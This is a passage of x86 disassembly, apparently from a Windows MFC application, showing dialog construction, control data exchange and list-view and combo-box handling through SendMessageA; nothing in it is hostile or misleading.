push esi
mov ebp ecx
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_408c30
push 0x1
mov ecx ebp
mov [ esp + 0xd0 ] ebx
call sub_440b18
mov eax [ ebp + 0x78 ]
push ebx
push ebx
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
cmp edi ebx
jge r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
lea esi [ ebp + 0x5c ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd0 ] 0x7
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push 0x4
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd0 ] 0x8
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push 0x3
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd0 ] 0x9
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push 0x2
lea ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd0 ] 0xa
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push ebx
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd0 ] 0xb
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
lea ecx [ esp + 0x18 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xcc ] 0x6
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xcc ] 0x5
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] 0x4
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xcc ] 0x3
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xcc ] 0x2
call sub_442148
mov [ esp + 0xcc ] 0x1
jmp r-xdata
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xcc ] 0x19
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xcc ] 0x18
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] 0x17
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xcc ] 0x16
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xcc ] 0x15
call sub_442148
mov [ esp + 0xcc ] 0x14
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
push ebx
lea ecx [ esp + 0x18 ]
push edi
push ecx
mov ecx esi
mov [ esp + 0xd8 ] 0xc
call sub_43c1f0
mov edx [ eax ]
lea eax [ esp + 0x10 ]
push edx
push rw-data
push eax
mov [ esp + 0xd8 ] 0xd
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0xcc ] 0xc
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ ebp + 0x98 ]
lea esi [ ebp + 0x98 ]
push ebx
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x74 ]
call sub_44f0ac
lea ecx [ esp + 0x18 ]
mov [ esp + 0xcc ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0xc4 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xc0
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0xbc ]
lea ecx [ ebp + 0x1ac ]
push eax
call sub_442281
lea ecx [ esp + 0xb8 ]
push ecx
lea ecx [ ebp + 0x1b8 ]
call sub_442281
lea edx [ esp + 0xc0 ]
lea ecx [ ebp + 0x1b4 ]
push edx
call sub_442281
lea eax [ esp + 0xb0 ]
lea ecx [ ebp + 0x1b0 ]
push eax
call sub_442281
lea ecx [ esp + 0xb4 ]
push ecx
lea ecx [ ebp + 0x1a8 ]
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x28 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx ebp
call sub_407e70
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xcc ] 0x13
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xcc ] 0x12
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] 0x11
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xcc ] 0x10
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xcc ] 0xf
call sub_442148
mov [ esp + 0xcc ] 0xe
jmp r-xdata
sub_408700
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45d210
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov edi ecx
push 0x0
push 0x0
push 0x1042
mov eax [ edi + 0x78 ]
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ edi + 0x5c ]
mov [ esp + 0x24 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x2c ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx edi
call sub_407e70
push eax
push eax
push rw-data
call sub_4496b7
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_408800
push 0xffffffff
push sub_45d311
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb4
push ebx
push ebp
push esi
mov ebp ecx
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_408c30
push 0x1
mov ecx ebp
mov [ esp + 0xd0 ] ebx
call sub_440b18
mov eax [ ebp + 0x78 ]
push ebx
push ebx
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
cmp edi ebx
jge r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
lea esi [ ebp + 0x5c ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd0 ] 0x7
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push 0x4
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd0 ] 0x8
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push 0x3
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd0 ] 0x9
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push 0x2
lea ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd0 ] 0xa
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push ebx
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd0 ] 0xb
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
lea ecx [ esp + 0x18 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xcc ] 0x6
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xcc ] 0x5
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] 0x4
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xcc ] 0x3
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xcc ] 0x2
call sub_442148
mov [ esp + 0xcc ] 0x1
jmp r-xdata
mov ecx [ esp + 0xd8 ]
mov [ ecx ] ebx
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xcc ] 0x19
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xcc ] 0x18
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] 0x17
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xcc ] 0x16
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xcc ] 0x15
call sub_442148
mov [ esp + 0xcc ] 0x14
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
push ebx
lea ecx [ esp + 0x18 ]
push edi
push ecx
mov ecx esi
mov [ esp + 0xd8 ] 0xc
call sub_43c1f0
mov edx [ eax ]
lea eax [ esp + 0x10 ]
push edx
push rw-data
push eax
mov [ esp + 0xd8 ] 0xd
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0xcc ] 0xc
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ ebp + 0x98 ]
lea esi [ ebp + 0x98 ]
push ebx
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x74 ]
call sub_44f0ac
lea ecx [ esp + 0x18 ]
mov [ esp + 0xcc ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0xc4 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xc0
retn 0x8
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0xbc ]
lea ecx [ ebp + 0x1ac ]
push eax
call sub_442281
lea ecx [ esp + 0xb8 ]
push ecx
lea ecx [ ebp + 0x1b8 ]
call sub_442281
lea edx [ esp + 0xc0 ]
lea ecx [ ebp + 0x1b4 ]
push edx
call sub_442281
lea eax [ esp + 0xb0 ]
lea ecx [ ebp + 0x1b0 ]
push eax
call sub_442281
lea ecx [ esp + 0xb4 ]
push ecx
lea ecx [ ebp + 0x1a8 ]
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x28 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx ebp
call sub_407e70
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xcc ] 0x13
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xcc ] 0x12
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] 0x11
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xcc ] 0x10
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xcc ] 0xf
call sub_442148
mov [ esp + 0xcc ] 0xe
jmp r-xdata
sub_408c30
push 0xffffffff
push sub_45d379
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x9d
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov edx [ rw-data ]
lea ecx [ esi + 0x98 ]
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x9c ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebx [ esi + 0xa0 ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0xa4 ]
mov [ ebp ] eax
mov edx [ rw-data ]
mov [ esi + 0xa8 ] edx
push rw-data
mov [ esp + 0x20 ] 0x6
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0xa8 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_408d40
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3ec
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3ec
push edi
call sub_449495
lea edx [ esi + 0x9c ]
push edx
push 0x425
push edi
call sub_4493f1
lea eax [ esi + 0xa0 ]
push eax
push 0x427
push edi
call sub_4493f1
lea ecx [ esi + 0xa4 ]
push ecx
push 0x3ea
push edi
call sub_4493f1
add esi 0xa8
push esi
push 0x3ed
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_408dd0
push 0xffffffff
push sub_45d401
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x128
push esi
mov esi ecx
call sub_43e113
push 0x0
lea ecx [ esp + 0x8 ]
call sub_40a470
push 0x0
push rw-data
push 0xffffffff
lea ecx [ esp + 0x10 ]
mov [ esp + 0x140 ] 0x0
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xcc ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x128 ]
mov [ esp + 0x134 ] 0x6
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0x5
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x134 ] 0x4
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x134 ] 0x3
call sub_442148
lea ecx [ esp + 0x118 ]
mov [ esp + 0x134 ] 0x2
call sub_442148
lea ecx [ esp + 0x114 ]
mov [ esp + 0x134 ] 0x1
call sub_442148
lea ecx [ esp + 0x4 ]
mov [ esp + 0x134 ] 0xffffffff
call sub_421723
xor eax eax
pop esi
mov ecx [ esp + 0x128 ]
mov [ fs : 0x0 ] ecx
add esp 0x134
retn
lea ecx [ esp + 0x4 ]
call sub_421900
lea ecx [ esp + 0x128 ]
mov [ esp + 0x134 ] 0xc
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0xb
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x134 ] 0xa
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x134 ] 0x9
call sub_442148
lea ecx [ esp + 0x118 ]
mov [ esp + 0x134 ] 0x8
call sub_442148
lea ecx [ esp + 0x114 ]
mov [ esp + 0x134 ] 0x7
call sub_442148
lea ecx [ esp + 0x4 ]
mov [ esp + 0x134 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x12c ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x134
retn
push edi
mov edi [ SendMessageA@IAT ]
mov eax [ esp + 0x118 ]
mov ecx [ esi + 0x78 ]
push eax
push 0x0
push 0x143
push ecx
call edi
mov edx [ esp + 0x8 ]
push 0x1
push 0x1
lea ecx [ esp + 0x10 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd0 ]
test eax eax
je r-xdata
pop edi
sub_408fe0
push esi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x9c ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x98 ]
mov eax [ ecx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov edx [ esi + 0xa4 ]
mov eax [ edx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov ecx esi
call sub_43e178
pop esi
retn
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
sub_409060
push 0xffffffff
push sub_45d45e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0x14 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebp [ esi + 0x118 ]
mov [ ebp ] edx
mov eax [ rw-data ]
lea ebx [ esi + 0x11c ]
mov [ ebx ] eax
mov edx [ rw-data ]
mov [ esi + 0x120 ] edx
push rw-data
mov [ esp + 0x20 ] 0x5
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
lea ecx [ esi + 0x120 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov [ esi + 0x14 ] 0x5
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_409170
push 0xffffffff
push sub_45d4b0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x120 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_409230
push 0xffffffff
push sub_45d589
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x86
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x1c ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x1c ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x14c ]
mov [ esp + 0x1c ] 0x4
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x188 ]
mov [ esp + 0x1c ] 0x5
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x1c4 ]
mov [ esp + 0x1c ] 0x6
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x200 ]
mov [ edi ] ecx
mov edx [ rw-data ]
lea ebx [ esi + 0x204 ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x208 ]
mov [ ebp ] eax
mov ecx [ rw-data ]
mov [ esi + 0x20c ] ecx
mov edx [ rw-data ]
mov [ esi + 0x210 ] edx
mov eax [ rw-data ]
mov [ esi + 0x214 ] eax
push 0x0
lea ecx [ esi + 0x218 ]
mov [ esp + 0x20 ] 0xd
call sub_40a470
mov [ esp + 0x1c ] 0xe
mov [ esi ] r--data
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0x20c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x210 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x214 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_409400
push 0xffffffff
push sub_45d6a9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x18 ] 0x0
lea edi [ esi + 0x218 ]
mov [ esp + 0xc ] edi
lea ecx [ edi + 0x124 ]
mov [ esp + 0x18 ] 0x13
call sub_442148
lea ecx [ edi + 0x120 ]
mov [ esp + 0x18 ] 0x12
call sub_442148
lea ecx [ edi + 0x11c ]
mov [ esp + 0x18 ] 0x11
call sub_442148
lea ecx [ edi + 0x118 ]
mov [ esp + 0x18 ] 0x10
call sub_442148
lea ecx [ edi + 0x114 ]
mov [ esp + 0x18 ] 0xf
call sub_442148
lea ecx [ edi + 0x110 ]
mov [ esp + 0x18 ] 0xe
call sub_442148
mov ecx edi
mov [ esp + 0x18 ] 0xd
call sub_421723
lea ecx [ esi + 0x214 ]
mov [ esp + 0x18 ] 0xc
call sub_442148
lea ecx [ esi + 0x210 ]
mov [ esp + 0x18 ] 0xb
call sub_442148
lea ecx [ esi + 0x20c ]
mov [ esp + 0x18 ] 0xa
call sub_442148
lea ecx [ esi + 0x208 ]
mov [ esp + 0x18 ] 0x9
call sub_442148
lea ecx [ esi + 0x204 ]
mov [ esp + 0x18 ] 0x8
call sub_442148
lea ecx [ esi + 0x200 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
lea ecx [ esi + 0x1c4 ]
mov [ esp + 0x18 ] 0x6
call sub_44f046
lea ecx [ esi + 0x188 ]
mov [ esp + 0x18 ] 0x5
call sub_44f046
lea ecx [ esi + 0x14c ]
mov [ esp + 0x18 ] 0x4
call sub_44f046
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
call sub_44f046
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
call sub_44f0ac
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_44f0ac
lea ecx [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx esi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_409590
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3e9
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3f1
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3f0
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x3ed
push edi
call sub_449556
lea ecx [ esi + 0x14c ]
push ecx
push 0x3e8
push edi
call sub_449556
lea edx [ esi + 0x188 ]
push edx
push 0x3ef
push edi
call sub_449556
lea eax [ esi + 0x1c4 ]
push eax
push 0x3ee
push edi
call sub_449556
lea ecx [ esi + 0x200 ]
push ecx
push 0x3f0
push edi
call sub_449495
lea edx [ esi + 0x204 ]
push edx
push 0x3f1
push edi
call sub_449495
lea eax [ esi + 0x208 ]
push eax
push 0x3ea
push edi
call sub_4493f1
lea ecx [ esi + 0x20c ]
push ecx
push 0x3ec
push edi
call sub_4493f1
lea edx [ esi + 0x210 ]
push edx
push 0x3eb
push edi
call sub_4493f1
add esi 0x214
push esi
push 0x3f2
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_4096a0
push 0xffffffff
push sub_45d728
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x240
push ebp
push esi
push edi
mov esi ecx
call sub_43e113
push 0x0
lea ecx [ esp + 0x134 ]
call sub_40b290
mov eax [ rw-data ]
mov [ esp + 0x254 ] 0x0
mov [ esp + 0xc ] eax
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x258 ] 0x1
call sub_4422d1
mov ecx [ esp + 0xc ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x13c ]
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0x1f8 ]
mov edi [ SendMessageA@IAT ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x130 ]
call sub_421900
push 0x0
lea ecx [ esp + 0x14 ]
call sub_413100
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x258 ] 0x2
call sub_4422d1
mov eax [ esp + 0xc ]
push 0x0
push eax
push 0xffffffff
lea ecx [ esp + 0x1c ]
call sub_42182c
test eax eax
jne r-xdata
mov edx [ esp + 0x244 ]
mov eax [ esi + 0xf0 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x130 ]
push 0x1
push 0x1
lea ecx [ esp + 0x138 ]
call [ edx + 0x14 ]
mov eax [ esp + 0x1f8 ]
test eax eax
je r-xdata
mov eax [ esp + 0xd8 ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x10 ]
call sub_421900
push 0xffffffff
push 0xffffffff
lea ebp [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x5
mov ecx ebp
call sub_43c126
mov ecx [ esi + 0x78 ]
push 0x3c
push 0x0
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x64
push 0x1
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x64
push 0x2
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x64
push 0x3
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x64
push 0x4
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0xa0
push 0x5
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push ecx
call edi
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x1c4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x188 ]
call sub_441841
mov ecx esi
call sub_409a20
lea ecx [ esp + 0x12c ]
mov [ esp + 0x254 ] 0x6
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x254 ] 0x5
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x254 ] 0x4
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x254 ] 0x3
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x254 ] 0x1
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x254 ] 0x0
call sub_442148
lea ecx [ esp + 0x248 ]
mov [ esp + 0x254 ] 0x9
call sub_442148
lea ecx [ esp + 0x244 ]
mov [ esp + 0x254 ] 0x8
call sub_442148
lea ecx [ esp + 0x240 ]
mov [ esp + 0x254 ] 0x7
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x254 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x24c ]
pop edi
pop esi
mov eax 0x1
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x24c
retn
mov ecx [ esp + 0x124 ]
mov edx [ esi + 0xb4 ]
push ecx
push 0x0
push 0x143
push edx
call edi
mov eax [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ eax + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
sub_409a20
push 0xffffffff
push sub_45d748
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
